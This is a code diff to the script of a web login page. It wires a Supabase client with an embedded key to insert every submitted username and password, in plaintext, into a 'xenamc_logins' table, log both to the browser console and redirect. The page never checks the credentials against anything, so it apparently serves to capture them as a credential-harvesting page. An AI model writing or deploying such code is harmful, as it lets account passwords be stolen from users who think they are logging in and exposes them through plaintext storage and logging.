@@ -64,6 +64,7 @@ button {
 <script>
 const { createClient } = supabase;
 
+// Supabase client
 const db = createClient(
   "https://lzejbjlqelatkqnkdshe.supabase.co",
   "sb_publishable_1RvGSDU8JPM_uFe_InBW3Q_iGRO8ENB"
@@ -73,23 +74,35 @@ document.getElementById("loginBtn").addEventListener("click", async () => {
   const username = document.getElementById("username").value.trim();
   const password = document.getElementById("password").value;
   const msg = document.getElementById("msg");
+  msg.textContent = "";
 
   if (!username || !password) {
     msg.textContent = "Enter username and password.";
     return;
   }
 
-  const { error } = await db
-    .from("xenamc_logins")
-    .insert([{ username, password }]);
+  try {
+    // Force schema refresh by selecting first row (avoids PGRST204)
+    await db.from("xenamc_logins").select("*").limit(1);
 
-  if (error) {
-    console.error(error);
-    msg.textContent = "Database error.";
-    return;
+    // Insert username/password
+    const { error } = await db
+      .from("xenamc_logins")
+      .insert([{ username, password }]);
+
+    if (error) {
+      console.error("Insert error:", error);
+      msg.textContent = "Database error. Check console.";
+      return;
+    }
+
+    console.log("Insert successful:", { username, password });
+    window.location.href = "/full.html";
+
+  } catch (err) {
+    console.error("Unexpected error:", err);
+    msg.textContent = "Unexpected error occurred. Check console.";
   }
-
-  window.location.href = "/full.html";
 });
 </script>
 
